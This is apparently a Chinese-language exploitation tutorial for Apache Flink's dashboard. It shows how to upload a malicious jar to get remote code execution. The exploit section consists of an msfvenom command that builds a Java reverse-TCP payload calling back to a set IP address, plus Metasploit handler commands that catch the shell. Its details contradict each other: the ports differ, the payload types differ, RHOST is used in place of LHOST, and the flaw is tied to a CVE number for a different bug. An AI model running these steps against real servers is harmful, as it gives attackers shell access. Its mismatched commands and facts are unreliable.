RCE(远程代码执行)是指攻击者能够在目标电脑（远程电脑）或目标进程中执行任意命令或代码。如果系统有地方可以被黑客利用以执行远程代码，则此处被称为远程代码执行漏洞。

一、基本介绍

Apache Flink 是一个框架和分布式处理引擎，用于在无边界和有边界数据流上进行有状态的计算。Flink 能在所有常见集群环境中运行，并能以内存速度和任意规模进行计算。Flink 默认带有Rest API，可用于查询"正在运行的jobs" 和 "最近完成的jobs" 的状态和统计信息。该API 被用于 Flink 的dashboard，同时也可用于自定义监控工具，默认监听在8081端口。攻击者可直接在Apache Flink Dashboard页面中上传任意jar包，从而达到远程代码执行的目的。

二、测试环境

Flink<= 1.11.2版本含有该RCE漏洞，该漏洞CVE编号是CVE-2020-17519。

1、下载安装并启动Flink的Dashboard

wget https://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz
tar -zxvf flink-1.9.1-bin-scala_2.11.tgz
cd flink-1.9.1/

2、访问安装Flink机器的8081端口

三、漏洞利用

1、电脑上需要安装Metasploit，详细安装教程可参考https://www.sqlsec.com/2019/11/macmsf.html

2、生成漏洞利用的Jar包,并通过页面上传

msfvenom -p java/meterpreter/reverse_tcp LHOST=10.128.100.128 LPORT=8090 -f jar > rce.jar

3、本地监听反弹端口,等待结果

use exploit/multi/handler

set payload java/shell/reverse_tcp

set RHOST 192.168.10.147

set LPORT 2020

run

4、发现反弹成功，可在本地机器执行Flink所在机器命令

四、总结

目前网络上流传的影响版本只是在1.9.1以下的版本，是因为当时该漏洞刚出来的时候，最新版本为1.9.1，但实际影响版本是小于1.11.2的版本。

解决方案：升级Flink到最新版本
